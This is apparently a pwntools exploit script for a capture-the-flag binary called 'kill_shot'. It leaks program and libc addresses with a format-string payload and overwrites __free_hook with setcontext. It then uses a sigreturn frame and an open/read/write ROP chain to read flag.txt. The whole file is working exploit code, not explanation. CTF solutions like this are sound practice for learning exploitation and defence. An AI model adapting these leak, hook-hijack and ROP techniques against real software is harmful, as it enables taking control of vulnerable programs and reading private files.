# encoding=utf-8
from pwn import *

file_path = "./kill_shot"

context.arch = "amd64"
elf = ELF(file_path)

p = process("./kill_shot", env={'LD_PRELOAD':"./libc.so.6"})
libc = ELF('./libc.so.6')


def add(size, content=b"1212"):
    p.sendlineafter("3- exit\n", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", content)


def delete(index):
    p.sendlineafter("3- exit\n", "2")
    p.sendlineafter("Index: ", str(index))


payload = "-%13$p-%25$p-"
p.sendlineafter("Format: ", payload)
p.recvuntil("-")
elf.address = int(p.recvuntil("-", drop=True), 16) - 0xd8c
libc.address = int(p.recvuntil("-", drop=True), 16) - 231 - libc.sym['__libc_start_main']
log.success("elf address is {}".format(hex(elf.address)))
log.success("libc address is {}".format(hex(libc.address)))

p.sendlineafter("Pointer: ", str(libc.sym['__free_hook']))
p.sendafter("Content: ", p64(libc.sym['setcontext'] + 53))

frame = SigreturnFrame()
frame.rip = libc.sym['read']
frame.rdi = 0
frame.rsi = libc.sym['__free_hook'] + 0x10
frame.rdx = 0x120
frame.rsp = libc.sym['__free_hook'] + 0x10


p_rsi_r = 0x0000000000023e8a + libc.address
p_rdi_r = 0x000000000002155f + libc.address
p_rdx_r = 0x0000000000001b96 + libc.address
p_rax_r = 0x0000000000043a78 + libc.address
syscall = 0x00000000000d29d5 + libc.address

flag_str_address = libc.sym['__free_hook'] + 0x110
flag_address = libc.sym['__free_hook'] + 0x140

orw = flat([
    p_rax_r, 257,
    p_rdi_r, 0xffffff9c,
    p_rsi_r, flag_str_address,
    p_rdx_r, 0,
    syscall, 
    p_rdi_r, 3,
    p_rsi_r, flag_address,
    p_rdx_r, 0x50,
    p_rax_r, 0,
    syscall,
    p_rdi_r, 1,
    p_rsi_r, flag_address,
    p_rdx_r, 0x50,
    p_rax_r, 1,
    syscall
])

add(0x60, b"1212")
add(len(bytes(frame)), bytes(frame))
delete(1)

pause()
payload = orw
payload = payload.ljust(0x100, b"\x00")
payload += b"flag.txt".ljust(0x20, b"\x00")
p.sendline(payload)
p.interactive()